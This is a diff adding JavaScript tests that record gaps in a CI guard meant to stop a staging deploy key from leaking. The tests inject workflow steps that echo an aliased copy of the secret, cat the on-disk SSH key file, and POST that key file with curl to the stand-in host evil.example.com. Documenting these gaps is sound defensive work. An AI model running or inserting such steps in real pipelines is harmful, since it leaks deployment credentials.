@@ -87,3 +87,64 @@ test('sanity: the allowlist guard does not flag the real workflow', () => {
   const yaml = fs.readFileSync(path.join(__dirname, '..', '..', 'deploy-staging.yml'), 'utf8');
   assert.ok(!violatesGuard(yaml), 'the real deploy-staging.yml must pass its own guard');
 });
+
+// QA follow-up (KAN-12 PR #15, commit e2f1a7d review): the allowlist guard only
+// ever looks for the literal token `$STAGING_DEPLOY_KEY` (with or without
+// braces). That closes every leak that keeps typing that exact variable name,
+// but a leak doesn't have to: the secret is also readable (a) under any OTHER
+// env-mapped alias to the same `secrets.STAGING_DEPLOY_KEY`, since the guard
+// never looks at the `env:` block at all, and (b) from the on-disk file the
+// legit step already writes it to (`$HOME/.ssh/staging_deploy_key`), with no
+// `$STAGING_DEPLOY_KEY` reference anywhere in the leaking step. Each of the
+// three cases below is appended to the REAL workflow (not a synthetic
+// fragment) and confirmed to slip past the guard untouched - these are new
+// findings, not regressions of the three bypasses already fixed, and per QA
+// instruction are reported without blocking this pass.
+
+const fs = require('node:fs');
+const path = require('node:path');
+const REAL_WORKFLOW = fs.readFileSync(path.join(__dirname, '..', '..', 'deploy-staging.yml'), 'utf8');
+
+test('KNOWN GAP: aliasing the secret to a second env: var name bypasses the guard entirely', () => {
+  const evilStep = [
+    '      - name: Debug (second env mapping)',
+    '        env:',
+    '          LEAKED_KEY: ${{ secrets.STAGING_DEPLOY_KEY }}',
+    '        run: |',
+    '          echo "$LEAKED_KEY"',
+  ].join('\n');
+  const injected = REAL_WORKFLOW + '\n' + evilStep + '\n';
+  assert.ok(
+    !violatesGuard(injected),
+    'documents that the allowlist guard does NOT catch a second env: mapping under a different var name - ' +
+      'it never inspects env: blocks, only literal $STAGING_DEPLOY_KEY references'
+  );
+});
+
+test('KNOWN GAP: catting the on-disk key file bypasses the guard entirely (zero var references)', () => {
+  const evilStep = [
+    '      - name: Debug (cat the file)',
+    '        run: |',
+    '          cat "$HOME/.ssh/staging_deploy_key"',
+  ].join('\n');
+  const injected = REAL_WORKFLOW + '\n' + evilStep + '\n';
+  assert.ok(
+    !violatesGuard(injected),
+    'documents that the allowlist guard does NOT catch a step that reads the already-written key file ' +
+      'directly - it only guards references to the $STAGING_DEPLOY_KEY shell variable, not the file it was written to'
+  );
+});
+
+test('KNOWN GAP: exfiltrating the on-disk key file (e.g. via curl) bypasses the guard entirely', () => {
+  const evilStep = [
+    '      - name: Exfil via curl reading file',
+    '        run: |',
+    '          curl -X POST --data-binary @"$HOME/.ssh/staging_deploy_key" https://evil.example.com/collect',
+  ].join('\n');
+  const injected = REAL_WORKFLOW + '\n' + evilStep + '\n';
+  assert.ok(
+    !violatesGuard(injected),
+    'documents that the allowlist guard does NOT catch exfiltration of the on-disk key file with no ' +
+      '$STAGING_DEPLOY_KEY reference at all - same root cause as the cat-the-file gap above'
+  );
+});
